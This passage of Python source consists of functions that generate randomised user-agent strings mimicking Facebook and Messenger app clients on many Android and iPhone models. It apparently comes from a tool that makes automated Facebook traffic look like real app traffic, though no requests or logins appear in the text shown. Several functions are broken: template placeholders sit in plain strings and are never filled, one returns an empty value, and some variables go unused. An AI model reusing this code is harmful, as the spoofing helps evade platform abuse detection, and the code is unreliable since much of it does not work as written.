[FB_IAB/FB4A;FBAV/382.0.0.33.111;]","Mozilla/5.0 (Linux; Android 6.0; BLL-L23 Build/HUAWEIBLL-L23; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/315.0.0.18.109;]","Mozilla/5.0 (Linux; Android 11; SM-M115F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]","Mozilla/5.0 (Linux; Android 12; SM-M115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/415.0.0.34.107;]","Mozilla/5.0 (Linux; Android 5.1; X9009 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/311.0.0.7.114;]","Mozilla/5.0 (Linux; Android 5.1; X9009 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/220.0.0.46.112;]","Mozilla/5.0 (Linux; Android 5.1; OPPO R9m Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/300.0.0.51.129;]","Mozilla/5.0 (Linux; Android 5.1; OPPO R9m Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]","Mozilla/5.0 (Linux; Android 5.1; OPPO R9m Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/332.0.0.23.111;]","Mozilla/5.0 (Linux; Android 5.1; X9009 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/332.0.0.23.111;]","Mozilla/5.0 (Linux; Android 5.1; X9009 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/330.0.0.31.120",])
    return ua

def iAmMethod2Ua():
    ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
    END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong','Ufone'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
    ua=random.choice(["",])
    return ua

def iAmMethod3Ua():
    ua = 'Mozilla/5.0 (Linux; Android 4.1.2; IdeaTabA1000L-F Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; IdeaTabA1000L-F Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; Lenovo L38043) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Lenovo L58041 Build/PKQ1.190127.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; Lenovo K14 Build/RONS31.267-94-3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.4.2; Lenovo A916 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; SM-A107M Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) VenusBrowser/3.2.36 Chrome/114.0.5735.131 Mobile Safari/537.36","Mozilla/5.0 (Linux; Tizen 3.0; SAMSUNG SM-Z400F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.0 Chrome/91.0.2526.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Tizen 3.0; SAMSUNG SM-Z400Y) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.0 Chrome/47.0.2526.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Tizen 2.4; SAMSUNG SM-Z400F) AppleWebKit/537.3 (KHTML, like Gecko) SamsungBrowser/1.1 Mobile Safari/537.3","Mozilla/5.0 (Linux; Tizen 4.0; SAMSUNG SM-R820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Tizen 5.5; SAMSUNG SM-R820) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.106 Mobile Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win32; x86) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36","Mozilla/5.0 (Linux; Android 12; Infinix X670 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; V2145A Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.210 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; V2254A Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10.0.1; Vivo S76 Build/MRA59K) AppleWebKit/547.34 (KHTML, like Gecko) Chrome/57.0.6587.139 YaBrowser/17.4.1.954.00 Mobile Safari/547.48","Mozilla/5.0 (Linux; Android 10; V1938T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/14.1.2.0","Mozilla/5.0 (Linux; U; Android 7.1; en-US; vivo X3S W Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.9.9.1155 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; vivo 3969) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.2.7790.221 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; CPH2527) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; CPH2527) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 13; CPH2527) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; RMX2050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; RMX2061 Build/RKQ1.201112.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.24 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3396 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 12; zh-CN; RMX3161 Build/RKQ1.211103.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 UCBrowser/15.3.6.1226 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3191 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; RMX2101 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; Infinix X698 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 11; Infinix X698) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; Infinix X670) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.1.0; Infinix X624B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36'
    return ua

def UA():
    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
    b = ";[FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/67467545;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"+"[FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
    c = ";[FBAN/Orca-Android;FBAV/44.0.0.8.52;FBPN/com.facebook.orca;FBLC/en_US;FBBV/16048044;FBCR/cricket;FBMF/zte;FBBD/zte;FBDV/Z987;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]"+"[FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507260;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2768};FB_FW/1;]"
    d = ";[FBAN/Orca-Android;FBAV/230.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_EG;FBBV/169378254;FBCR/Android;FBMF/samsung;FBBD/samsung;FBDV/SM-N9005;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;]"+"[FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;]"
    ua = a+b+c+d
    return ua
    
def UA1():
    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
    b = ";[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A310F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1812};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI VNS-L31;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua = a+b
    return ua    

def UAA():
    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
    b = ";[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A310F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1812};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI VNS-L31;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua = a+b
    return ua

def __UPX__():
    ua1 = "[FBAN/FB4A;FBAV/388.0.0.32.105;FBBV/317616396;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/Banglalink;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9070;FBSV/2.3.6;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua2 = "[FBAN/FB4A;FBAV/381.0.0.29.105;FBBV/316215288;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/FBCR/Teletalk;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/TA-1024;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua3 = "[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=3.0,width=1080,height=2016};FBLC/en_US;FBRV/FBCR/Grameenphone;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1721;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua4 = "[FBAN/FB4A;FBAV/389.0.0.42.111;FBBV/317817218;FBDM/{density=4.0,width=1440,height=2368};FBLC/en_US;FBRV/FBCR/Robi;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto Z (2);FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
    ua5 = "[FBAN/FB4A;FBAV/377.0.0.22.107;FBBV/315414711;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/Airtel;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    __uaxx__ = random.choice([ua1,ua2,ua3,ua4,ua5])
    __max__ = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{__uaxx__}'
    return str(__max__)

def shajon():
    END = '[FBAN/EMA;FBBV/352223683;FBAV/291.0.0.12.110;FBDV/SM-G935FD;FBLC/en_GB;FBNG/WIFI;FBMNT/NOT_METERED;FBDM/{density=1.0125}]'
    ua = f'''Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ''' + END
    return ua

def sanjida():
    vchrome = str(random.randint(100, 925)) + '.0.0.' + str(random.randint(1, 8)) + '.' + str(random.randint(40, 150))
    VAPP = random.randint(410000000, 499999999)
    END = '[FBAN/FB4A;FBAV/374.0.0.20.109;FBBV/381462200;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/382083935;FBCR/1010;FBMF/Green;FBBD/Green;FBPN/com.facebook.katana;FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
    ua = f'''Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ''' + END
    return ua

def cent6():
    END = '[FBAN/FB4A;FBAV/88.0.0.22.76;FBBV/35266892;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBCR/vodafone IT;FBMF/KOMU;FBBD/KOMU;FBPN/com.facebook.katana;FBDV/Komu Color;FBSV/4.4.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model3)}  Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua

def ethan6():
    END = '[FBAN/Orca-Android;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=2.5,width=720,height=1280};FBLC/en_BD;FBCR/null;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.orca;FBDV/CPH1893;FBSV/10;FBOP/1;FBCA/arm64-v8a:armeabi-v7a:armeabi;]"'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model3)}  Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua

def randua():
    abc = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
    pkgs = random.choice(['com.facebook.katana','com.facebook.mlite','com.facebook.lite','com.facebook.adsmanager','com.facebook.liteh'])
    build = random.choice(abc)+random.choice(abc)+random.choice(abc)
    FBBV = str(random.randint(111111111,999999999))
    FBCR = random.choice(["Jazz","Zong","Mobilink","Ufone"])
    ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
    ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))[FBAN/FB4A;FBAV/34.0.0.3318;FBBV/3438742;[FBAN/FB4A;FBAV/196.0.0.79;FBBV/442082200;FBDM/{density=2.0,width=1280,height=1440};FBLC/en_AU;FBRV/886067563;FBCR/MobileNation;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX1971;FBSV/10.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",])
    return ua
    
def sawg():
    model = random.choice(["Redmi 6","Redmi 7","Redmi 8","Redmi 5","Redmi 4","Redmi 3","Redmi 2"])
    bal = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+f";[FBAN/FB4A;FBAV/451.0.0.45.109;FBBV/449217850;FBDM/"+"{density=2.75,width=1080,height=2168}"+f";FBLC/en_US;FBRV/441815108;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/{model};FBSV/5.1.1;FBOP/1;FBCA/arm64-v8a:;]"
    return bal

def ua1():
    alex1 = str(random.randint(100,400))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    alex9 = str(random.randint(200,400))+".0.0."+str(random.randint(7,37))+"."+str(random.randint(101,151))
    alex2 = random.randint(410000000,499999999)
    cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853','CPH2127', 'CPH2131','PDVM00','CPH2095','CPH2119','PEAT00', 'PEAM00','CPH2137','CPH2125','CPH2065','CPH2121', 'CPH2123','CPH2099','CPH2139', 'CPH2135','CPH2185','SPH2209','CPH2161','PERM00','CPH2109','CPH2113','PDYM20', 'PDYT20','PDNM00', 'PDNT00', 'CPH2089'])  
    ua = f"Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)};  Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)})"+"[FBAN/"+"FB4A;FBAV/"+str(random.randint(11,77))+".0.0."+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/110.0.0.17.29FBBV/8243059FBDM/{density=3.0,width=840,height=953}FBLC/zh_CNFBRV/8304687FBCR/Boost MobileFBMF/SamsungFBBD/SamsungFBPN/com.facebook.katanaFBDV/SM-G973FFBSV/5.0FBOP/1FBCA/x86:armeabi-v7a]"
    return ua

def warlee():
    and_ver = str(random.randrange(9,12))
    app_ver = str(random.randint(111,999))+".0.0."+str(random.randrange(9,99))+"."+str(random.randint(111,333))
    app_ver1 = str(random.randint(111,999))+".0.0."+str(random.randrange(9,99))+"."+str(random.randint(111,333))
    app_ver_code = str(random.randint(111111111,999999999))
    app_ver_code1 = str(random.randint(111111111,999999999))
    model = random.choice(["CPH2411", "CPH2423", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2447", "CPH2449", "CPH2451", "CPH2399", "CPH2401", "CPH2381", "CPH2409", "CPH2459", "CPH2477", "CPH2471", "CPH1923", "CPH1837", "CPH1803", "CPH1853", "CPH1809", "CPH1931", "CPH1933", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2133", "CPH2139", "CPH2135", "CPH2303", "CPH2387", "CPH2407", "CPH2385", "CPH1901", "CPH1905", "CPH2067", "CPH2219", "CPH2339", "CPH2483", "CPH2495", "CPH1937", "CPH1941", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH1920", "CPH1903", "CPH1705fw", "CPH1605", "OPPO CPH1605", "CPH1605fw", "CPH1609", "CPH1609fw", "CPH1613", "CPH1613fw", "CPH1701", "CPH1701fw", "CPH1705", "CPH1707", "CPH1707fw", "CPH1715", "CPH1717", "CPH1719", "CPH1721", "CPH1723", "CPH1725", "CPH1727", "CPH1729", "CPH1801", "CPH1803", "CPH1805", "CPH1807", "CPH1808", "CPH1827", "CPH1851", "CPH1853", "CPH1893", "CPH1893", "CPH1903", "CPH1907", "CPH1909", "CPH1938", "CPH1989", "CPH2001", "CPH2015", "CPH2021", "CPH2031", "CPH2043", "CPH2071", "CPH2073", "CPH2077", "CPH2081", "CPH2083", "CPH2095", "CPH2109", "CPH2113", "CPH2145", "CPH2159", "CPH2161", "CPH2173", "CPH2179", "CPH2185", "CPH21859", "CPH2195", "CPH2197", "CPH2201", "CPH2207", "CPH2211", "CPH2213", "CPH2219", "CPH2223", "CPH2235", "CPH2237", "CPH2239", "CPH2241", "CPH2247", "CPH2249", "CPH2251", "CPH2263", "CPH2269", "CPH2271", "CPH2273", "CPH2275", "CPH2293", "CPH2309", "CPH2325", "CPH2365", "CPH2421", "CPH2455", "CPH2457", "CPH2461", "CPH2473", "CPH1911", "CPH1913", "CPH1915", "CPH1969", "CPH1987", "CPH2119", "CPH2285", "CPH1819", "CPH1821", "CPH1823", "CPH1825", "CPH1881", "CPH2437", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2009", "CPH2025", "CPH2173", "CPH2307", "CPH2305", "CPH1955", "CPH2137", "CPH2321", "CPH2385", "CPH2197", "CPH2341", "CPH2199", "CPH2201", "CPH2237", "CPH2363", "CPH2371", "CPH2371", "CPH2353", "CPH2343", "CPH2343", "CPH2363", "CPH2359", "CPH2357", "CPH1835", "CPH1831", "CPH1833", "CPH1833", "CPH1879", "CPH1877", "CPH1607", "CPH1607fw", "CPH1611", "CPH1917", "CPH1917", "CPH1921", "CPH1919", "CPH1919RU", "CPH1919", "CPH1921", "CPH1907", "CPH2065", "CPH1983", "CPH1979", "CPH1979", "CPH1945", "CPH1951", "CPH2043", "CPH2013", "CPH2009", "CPH2035", "CPH2036", "CPH2037", "CPH2091", "CPH2209", "CPH2125", "CPH2089", "CPH2089", "CPH2159", "CPH2217", "CPH2205", "CPH2343", "CPH2505", "CPH1859", "CPH1861"])
    model1 = random.choice(["Infinix_X689F", "Infinix_X682B", "Infinix_X682C", "Infinix_X657B", "Infinix_X688B", "Infinix_X688C", "Infinix_X657B", "Infinix_X658B", "Infinix_X658E", "Infinix_X659", "Infinix_X659B", "Infinix_X662", "Infinix_X662B", "Infinix_X689F", "Infinix_X675", "Infinix_X6812", "Infinix_X665", "Infinix_X665B", "Infinix_X510", "Infinix_X6827", "Infinix_X665C", "Infinix_X665E", "Infinix_HOT 3 Pro", "Infinix-X554", "Infinix_HOT 3 LTE", "Infinix_HOT 3 LTE", "Infinix_HOT 4", "Infinix_HOT4 LTE", "Infinix_HOT 4", "Infinix_X557", "Infinix_HOT 4", "Infinix_HOT 4", "Infinix_HOT 4 Lite", "Infinix_HOT 4 Pro", "Infinix_X556_LTE", "Infinix_HOT 4 Pro", "Infinix_HOT 4 Pro", "Infinix_X606", "Infinix_X606B", "Infinix_X606C", "Infinix_X606D", "Infinix_X608", "Infinix_X624", "Infinix_X624B", "Infinix_X625B", "Infinix_X625D", "Infinix_X650B", "Infinix_X650C", "Infinix_X650D", "Infinix_X650", "Infinix-X551", "Infinix_X688B", "Infinix_X688C", "Infinix_X573", "Infinix_X573S", "Infinix_X573B", "Infinix_X622", "Infinix_X559C", "Infinix_X559F", "Infinix_X559", "Infinix_HOT 4", "Infinix_HOT 4 Pro", "Infinix_X657B", "Infinix_X689", "Infinix_X689B", "Infinix_X689D", "Infinix_X689C", "Infinix_PR652B", "Infinix_PR652C", "Infinix_X6812B", "Infinix_X6817", "Infinix_X668", "Infinix_X668C", "Infinix_X6816C", "Infinix_X6816D", "Infinix_X6826", "Infinix_X6826B", "Infinix_X6826C", "Infinix_X6835", "Infinix_X6835B", "Infinix_X669", "Infinix_X669C", "Infinix_X669D", "Infinix_X623", "Infinix_X623B", "Infinix_X625C", "Infinix_X625C", "Infinix_X655", "Infinix_X655C", "Infinix_X655D", "Infinix_X680", "Infinix_X680B", "Infinix_X680C", "Infinix_X680E", "Infinix_X680F", "Infinix_X655F", "Infinix_X693", "Infinix_X663B", "Infinix_X693", "Infinix_X663C", "Infinix_X676C", "Infinix_X671", "Infinix_X676B", "Infinix_X671B", "Infinix_X6819", "Infinix_X6833B", "Infinix_X604", "Infinix_X604B", "Infinix_X605", "Infinix_X656", "Infinix_X604", "Infinix_X604B", "Infinix_X680", "Infinix_X680D", "Infinix_X6515", "Infinix_X6516", "Infinix_X5010", "Infinix_X510", "Infinix_X559", "Infinix_X571", "Infinix_X572", "Infinix_X6821", "Infinix_X6815B", "Infinix_X687B", "Infinix_X6811B", "Infinix_X6810", "Infinix_X6811", "Infinix_X687", "Infinix_X663", "Infinix_X695", "Infinix_X695C", "Infinix_X695D", "Infinix_X697", "Infinix_X698", "Infinix_X670", "Infinix_X676B", "Infinix_X672", "Infinix_X677", "Infinix_NOTE 3", "Infinix_NOTE 3 Pro", "Infinix_NOTE 3 Pro", "Infinix_X601_LTE", "Infinix_X572", "Infinix_X572-LTE", "Infinix_X571", "Infinix_X571-LTE", "Infinix_X690", "Infinix_X690B", "Infinix_X690C", "Infinix_X692", "Infinix_X683", "Infinix_X683B", "Infinix_X610B", "Infinix_X454", "Infinix_X455", "Infinix_S2", "Infinix_S2 Pro", "Infinix_X626", "Infinix_X626B", "Infinix_X626B LTE", "Infinix_X652", "Infinix_X652A", "Infinix_X652B", "Infinix_X652C", "Infinix_X660", "Infinix_X660B", "Infinix_X660C", "Infinix_X657", "Infinix_X657B", "Infinix_X657C", "Infinix_X6511", "Infinix_X657B", "Infinix_X6511", "Infinix_X6511B", "Infinix_X6511E", "Infinix_X6512", "Infinix_X6511G", "Infinix_X6823", "Infinix_X6823C", "Infinix_X6517", "Infinix_X612", "Infinix_X612B", "Infinix_X511", "Infinix_X5515", "Infinix_X5515F", "Infinix_X5515I", "Infinix_X609", "Infinix_X609B", "Infinix_X5514D", "Infinix_X5516", "Infinix_X5516B", "Infinix_X5516C", "Infinix_X627", "Infinix_X627V", "Infinix_X627W", "Infinix_X653", "Infinix_X653C", "Infinix_X405", "Infinix_X505", "Infinix_HOT S", "Infinix-X521", "Infinix-X521-LTE", "Infinix_X521", "Infinix-X521", "Infinix-X521", "Infinix_X521", "Infinix_X521_LTE", "Infinix-X521", "Infinix_X521", "Infinix_X521", "Infinix_HOT S", "Infinix-X521", "Infinix_X521", "Infinix-X521", "Infinix-X521_LTE", "Infinix_X521", "Infinix-X521S", "Infinix_X521S", "Infinix_Zero 3", "Infinix-X552", "Infinix-X552", "Infinix_Zero 3", "Infinix-X552", "Infinix_Zero 3", "Infinix-X552", "Infinix_Zero 4", "Infinix_HOT 4", "Infinix_X572", "Infinix_X572-LTE", "Infinix-X600", "Infinix-X600-LTE", "Infinix_X6815", "Infinix_X6815C", "Infinix_X6815D", "Infinix_X6820", "Infinix_X6811", "Infinix_X509", "Infinix_Zero 4", "Infinix_Zero 4 Plus", 